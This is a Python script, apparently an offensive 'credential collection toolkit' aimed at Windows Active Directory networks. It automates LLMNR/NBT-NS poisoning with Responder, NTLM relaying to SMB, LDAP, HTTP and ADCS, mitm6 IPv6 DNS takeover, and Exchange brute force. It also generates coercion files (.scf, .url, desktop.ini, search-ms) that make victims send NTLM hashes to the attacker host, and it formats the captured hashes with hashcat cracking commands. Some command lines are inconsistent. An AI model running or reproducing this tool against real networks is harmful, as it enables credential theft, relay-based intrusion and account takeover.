#!/usr/bin/env python3

import os
import sys
import time
import json
import shutil
import logging
import argparse
import netifaces
from datetime import datetime
from pathlib import Path
from threading import Thread, Event
from termcolor import colored
from subprocess import Popen, PIPE
import signal
import random
import string

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AttackPhase:
    """Class to define an attack phase"""
    def __init__(self, name, commands, duration=300, dependencies=None, cleanup_commands=None):
        self.name = name
        self.commands = commands if isinstance(commands, list) else [commands]
        self.duration = duration
        self.dependencies = dependencies or []
        self.cleanup_commands = cleanup_commands or []
        self.success = False
        self.output_dir = None
        self.processes = []

class DirectoryManager:
    """Manages directory structure and file organization"""
    def __init__(self, output_dir):
        self.output_dir = Path(output_dir)
        self.structure = {
            'responder': 'LLMNR/NBT-NS/mDNS Poisoning',
            'smbrelay': 'SMB Relay Attacks',
            'ldaprelay': 'LDAP Relay Attacks',
            'httprelay': 'HTTP Relay Attacks',
            'adcs': 'Active Directory Certificate Services',
            'mitm6': 'IPv6 DNS Takeover',
            'webdav': 'WebDAV Authentication',
            'exchange': 'Exchange Server Attacks',
            'winrm': 'Windows Remote Management',
            'mssql': 'Microsoft SQL Server',
            'mqtt': 'MQTT Protocol',
            'smtp': 'Mail Protocol Attacks',
            'hashes': 'Captured Hashes',
            'logs': 'Attack Logs',
            'coerce': 'Authentication Coercion Files'
        }

    def setup(self):
        """Create directory structure"""
        try:
            for name, desc in self.structure.items():
                dir_path = self.output_dir / name
                dir_path.mkdir(parents=True, exist_ok=True)
                (dir_path / '.info').write_text(f"Purpose: {desc}\nCreated: {datetime.now()}")
            return True
        except Exception as e:
            logger.error(f"Directory setup error: {e}")
            return False

class CoercionFileGenerator:
    """Generates authentication coercion files"""
    def __init__(self, output_dir, server_ip):
        self.output_dir = Path(output_dir) / 'coerce'
        self.server_ip = server_ip

    def generate_files(self):
        """Generate all coercion file types"""
        files = {
            'search.search-ms': self._get_search_ms_content(),
            'share.scf': self._get_scf_content(),
            'share.url': self._get_url_content(),
            'print.xml': self._get_print_content(),
            'desktop.ini': self._get_desktop_ini_content()
        }

        for filename, content in files.items():
            try:
                (self.output_dir / filename).write_text(
                    content.format(server=self.server_ip)
                )
            except Exception as e:
                logger.error(f"Error creating {filename}: {e}")

    def _get_search_ms_content(self):
        return """<?xml version="1.0"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>imageres.dll,-1002</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\{server}\\share</url>
    </simpleLocation>
</searchConnectorDescription>"""

    def _get_scf_content(self):
        return """[Shell]
Command=2
IconFile=\\\\{server}\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop"""

    def _get_url_content(self):
        return """[InternetShortcut]
URL=file://{server}/share/
IconFile=\\\\{server}\\share\\icon.ico
IconIndex=1"""

    def _get_print_content(self):
        return """<?xml version="1.0" encoding="UTF-8"?>
<descendantfonts>
<print>
<properties xmlns="http://schemas.microsoft.com/windows/2006/propertiesschema">
<property name="System.ItemNameDisplay">\\\\{server}\\share\\file</property>
</properties>
</print>
</descendantfonts>"""

    def _get_desktop_ini_content(self):
        return """[.ShellClassInfo]
IconResource=\\\\{server}\\share\\icon.ico
[ViewState]
Mode=
Vid=
FolderType=Generic"""

class AttackManager:
    """Manages attack execution and coordination"""
    def __init__(self, interface, output_dir):
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.stop_event = Event()
        self.local_ip = self._get_local_ip()
        
        # Initialize managers
        self.dir_manager = DirectoryManager(output_dir)
        self.coercion_gen = CoercionFileGenerator(output_dir, self.local_ip)
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _get_local_ip(self):
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            logger.error(f"Error getting local IP: {e}")
            return "127.0.0.1"

    def _signal_handler(self, signum, frame):
        self.stop_event.set()

    def _get_attack_phases(self):
        """Define all attack phases"""
        phases = []
        
        # LLMNR/NBT-NS/mDNS Poisoning
        phases.append(AttackPhase(
            name="LLMNR/NBT-NS Poisoning",
            commands=[
                f'responder -I {self.interface} -wrfv',
                # Add --lm and --disable-ess if specified in args
            ],
            duration=300,
            cleanup_commands=['pkill -f responder']
        ))

        # SMB Relay
        phases.append(AttackPhase(
            name="SMB Relay",
            commands=[
                f'impacket-ntlmrelayx -tf {self.output_dir}/smbrelay/targets.txt '
                f'-smb2support -socks -tf targets.txt'
            ],
            duration=300
        ))

        # LDAP Relay
        phases.append(AttackPhase(
            name="LDAP Relay",
            commands=[
                f'impacket-ntlmrelayx -tf {self.output_dir}/ldaprelay/targets.txt '
                f'-t ldap://dc.domain.com -wh attacker-wpad --delegate-access'
            ],
            duration=300
        ))

        # HTTP Relay
        phases.append(AttackPhase(
            name="HTTP Relay",
            commands=[
                f'impacket-ntlmrelayx -tf {self.output_dir}/httprelay/targets.txt '
                f'-t http://web.domain.com -l {self.output_dir}/httprelay'
            ],
            duration=300
        ))

        # IPv6 DNS Takeover
        phases.append(AttackPhase(
            name="IPv6 DNS Takeover",
            commands=[
                f'mitm6 -i {self.interface} -d domain.com',
                f'impacket-ntlmrelayx -6 -wh {self.local_ip} -t smb://dc.domain.com'
            ],
            duration=300
        ))

        # ADCS Attack
        phases.append(AttackPhase(
            name="ADCS Certificate Attack",
            commands=[
                f'certipy find -u user@domain.com -p password -dc-ip 10.10.10.10',
                f'certipy req -u user@domain.com -p password -dc-ip 10.10.10.10'
            ],
            duration=300
        ))

        # WebDAV
        phases.append(AttackPhase(
            name="WebDAV Authentication",
            commands=[
                f'wsgidav --host {self.local_ip} --port 80 --auth anonymous '
                f'--root {self.output_dir}/webdav'
            ],
            duration=300
        ))

        # WinRM
        phases.append(AttackPhase(
            name="WinRM Attack",
            commands=[
                f'evil-winrm -i {self.local_ip} -u administrator -p password'
            ],
            duration=300
        ))

        # Exchange
        phases.append(AttackPhase(
            name="Exchange Attack",
            commands=[
                f'ruler -k -d domain.com -u user -p password -e administrator@domain.com '
                f'--verbose brute'
            ],
            duration=300
        ))

        # MSSQL
        phases.append(AttackPhase(
            name="MSSQL Attack",
            commands=[
                f'impacket-mssqlclient domain/user:password@{self.local_ip}'
            ],
            duration=300
        ))

        return phases

    def run_attacks(self):
        """Execute all attack phases"""
        if not self.dir_manager.setup():
            logger.error("Failed to setup directory structure")
            return False

        # Generate coercion files
        self.coercion_gen.generate_files()

        # Get attack phases
        phases = self._get_attack_phases()

        for phase in phases:
            if self.stop_event.is_set():
                break

            logger.info(f"Starting {phase.name}")
            phase.output_dir = self.output_dir / phase.name.lower().replace(" ", "_")
            phase.output_dir.mkdir(exist_ok=True)

            # Start all commands for this phase
            for cmd in phase.commands:
                try:
                    process = self._run_command(cmd)
                    if process:
                        phase.processes.append(process)
                except Exception as e:
                    logger.error(f"Error starting {phase.name}: {e}")
                    continue

            # Wait for phase duration
            try:
                time.sleep(phase.duration)
            except KeyboardInterrupt:
                logger.info("Phase interrupted by user")
                break
            finally:
                # Cleanup phase
                self._cleanup_phase(phase)

        return True

    def _run_command(self, cmd):
        """Execute a command with output monitoring"""
        try:
            process = Popen(
                cmd.split(),
                stdout=PIPE,
                stderr=PIPE,
                universal_newlines=True
            )

            def monitor_output():
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        logger.info(output.strip())

            Thread(target=monitor_output, daemon=True).start()
            return process

        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return None

    def _cleanup_phase(self, phase):
        """Cleanup after an attack phase"""
        for process in phase.processes:
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                process.kill()

        for cmd in phase.cleanup_commands:
            try:
                os.system(cmd)
            except Exception as e:
                logger.error(f"Cleanup command error: {e}")

class HashExtractor:
    """Extracts and formats hashes for cracking"""
    def __init__(self, output_dir):
        self.output_dir = Path(output_dir)
        self.hash_dir = self.output_dir / 'hashes'
        self.hash_dir.mkdir(exist_ok=True)

    def extract_hashes(self):
        """Extract all hashes from attack outputs"""
        today = datetime.now().date()
        
        hash_types = {
            'ntlmv1': self.hash_dir / 'ntlmv1.txt',
            'ntlmv2': self.hash_dir / 'ntlmv2.txt',
            'krb5tgs': self.hash_dir / 'krb5tgs.txt',
            'asrep': self.hash_dir / 'asrep.txt',
            'netntlmv2': self.hash_dir / 'netntlmv2.txt'
        }

        # Create/clear hash files
        for f in hash_types.values():
            f.write_text('')

        # Process Responder logs
        responder_dir = self.output_dir / 'responder'
        if responder_dir.exists():
            self._process_responder_hashes(responder_dir, hash_types)

        # Process relay captures
        relay_dir = self.output_dir / 'relay'
        if relay_dir.exists():
            self._process_relay_hashes(relay_dir, hash_types)

        # Generate summary
        self._generate_summary(hash_types)

    def _process_responder_hashes(self, responder_dir, hash_types):
        """Process Responder captured hashes"""
        for hash_file in responder_dir.glob('*-NTLMv*-*.txt'):
            content = hash_file.read_text().strip()
            if content:
                if 'NTLMv2' in hash_file.name:
                    hash_types['ntlmv2'].write_text(
                        hash_types['ntlmv2'].read_text() + content + '\n'
                    )
                elif 'NTLMv1' in hash_file.name:
                    hash_types['ntlmv1'].write_text(
                        hash_types['ntlmv1'].read_text() + content + '\n'
                    )

    def _process_relay_hashes(self, relay_dir, hash_types):
        """Process relay captured hashes"""
        for hash_file in relay_dir.glob('*hash*.txt'):
            content = hash_file.read_text().strip()
            if content:
                if 'netntlmv2' in hash_file.name.lower():
                    hash_types['netntlmv2'].write_text(
                        hash_types['netntlmv2'].read_text() + content + '\n'
                    )

    def _generate_summary(self, hash_types):
        """Generate hash summary and cracking commands"""
        summary = self.hash_dir / 'summary.txt'
        
        with summary.open('w') as f:
            f.write("Hash Collection Summary\n")
            f.write("=====================\n\n")
            
            for hash_type, file_path in hash_types.items():
                count = len([line for line in file_path.read_text().splitlines() if line.strip()])
                f.write(f"{hash_type}: {count} hashes\n")
            
            # Write hashcat commands
            f.write("\nHashcat Commands:\n")
            f.write("================\n")
            f.write(f"NTLMv1: hashcat -m 5500 {hash_types['ntlmv1']} wordlist.txt\n")
            f.write(f"NTLMv2: hashcat -m 5600 {hash_types['ntlmv2']} wordlist.txt\n")
            f.write(f"NetNTLMv2: hashcat -m 5600 {hash_types['netntlmv2']} wordlist.txt\n")
            f.write(f"Kerberos TGS: hashcat -m 13100 {hash_types['krb5tgs']} wordlist.txt\n")
            f.write(f"AS-REP: hashcat -m 18200 {hash_types['asrep']} wordlist.txt\n")

def main():
    parser = argparse.ArgumentParser(description="Advanced Credential Collection Toolkit")
    
    # Main options
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-d", "--domain", help="Target domain name")
    parser.add_argument("-dc", "--dc-ip", help="Domain controller IP")
    
    # Attack options
    parser.add_argument("--auto", action="store_true", help="Run all attacks sequentially")
    parser.add_argument("--duration", type=int, default=300, help="Duration per attack phase in seconds")
    
    # Specific attack enables
    parser.add_argument("--responder", action="store_true", help="Run Responder attacks")
    parser.add_argument("--relay", action="store_true", help="Run NTLM relay attacks")
    parser.add_argument("--mitm6", action="store_true", help="Run mitm6 IPv6 attacks")
    parser.add_argument("--adcs", action="store_true", help="Run ADCS attacks")
    
    # Additional options
    parser.add_argument("--lm", action="store_true", help="Enable LM downgrade")
    parser.add_argument("--disable-ess", action="store_true", help="Disable Extended Session Security")
    parser.add_argument("--extract-only", action="store_true", help="Only extract hashes from previous runs")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()

    # Check root privileges
    if os.geteuid() != 0:
        print(colored("[-] This script must be run as root", 'red'))
        sys.exit(1)

    # Setup logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Create output directory with timestamp
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    output_dir = Path(f"output/{timestamp}")
    output_dir.mkdir(parents=True, exist_ok=True)

    try:
        # Initialize attack manager
        attack_mgr = AttackManager(args.interface, output_dir)
        
        if args.extract_only:
            # Only extract hashes from previous runs
            hash_extractor = HashExtractor(output_dir)
            hash_extractor.extract_hashes()
        elif args.auto:
            # Run all attacks sequentially
            attack_mgr.run_attacks()
        else:
            # Run specific attacks based on arguments
            if args.responder:
                attack_mgr._run_command(f'responder -I {args.interface} -wrfv')
                
            if args.relay:
                attack_mgr._run_command(
                    f'impacket-ntlmrelayx -tf targets.txt -smb2support -socks'
                )
                
            if args.mitm6 and args.domain:
                attack_mgr._run_command(f'mitm6 -i {args.interface} -d {args.domain}')
                
            if args.adcs and args.dc_ip:
                attack_mgr._run_command(
                    f'impacket-ntlmrelayx -tf targets.txt -t http://{args.dc_ip}/certsrv/certfnsh.asp'
                )

        print(colored("[+] Attack sequence completed", 'green'))
        print(colored(f"[*] Results saved in: {output_dir}", 'blue'))

    except KeyboardInterrupt:
        print(colored("\n[!] Attack interrupted by user", 'yellow'))
    except Exception as e:
        print(colored(f"[-] Error: {str(e)}", 'red'))
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        # Always try to extract hashes at the end
        try:
            hash_extractor = HashExtractor(output_dir)
            hash_extractor.extract_hashes()
            print(colored("[+] Hashes extracted and formatted for hashcat", 'green'))
        except Exception as e:
            print(colored(f"[-] Error extracting hashes: {str(e)}", 'red'))

if __name__ == "__main__":
    main()
